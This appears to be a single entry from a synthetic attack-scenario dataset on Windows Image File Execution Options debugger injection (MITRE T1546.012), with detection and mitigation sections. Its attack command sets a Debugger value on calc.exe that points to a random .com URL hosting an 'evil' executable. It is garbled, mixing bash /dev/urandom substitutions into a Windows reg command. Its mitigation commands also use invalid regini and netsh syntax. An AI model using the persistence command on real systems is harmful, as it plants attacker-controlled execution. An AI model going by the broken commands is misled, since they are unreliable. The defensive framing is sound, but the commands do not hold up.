---
type: campaign
scenario_id: 244
tactic: Persistence
technique: "T1546.012: Image File Execution Options Injection"
technique_id: T1546.012
tags: [campaign, lotl, persistence]
---

# Using IFEO remotely to inject malicious debugger.

## Threat Description
Using IFEO remotely to inject malicious debugger.

## Attack Command
```
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t REG_SZ /d "http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)"
```

## Detection Logic
Monitor IFEO: `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | findstr http`; Event ID 4657.

## Mitigation
Restrict IFEO writes: `regini -h deny "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"`; Block debugger downloads: `netsh advfirewall firewall add rule name='Block IFEO' dir=out action=block protocol=HTTP`.

## AI Training Prompt
Train AI to detect remote IFEO debugger injections and suggest firewall rules.

## References
- MITRE ATT&CK T1546.012: https://attack.mitre.org/techniques/T1546/012/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
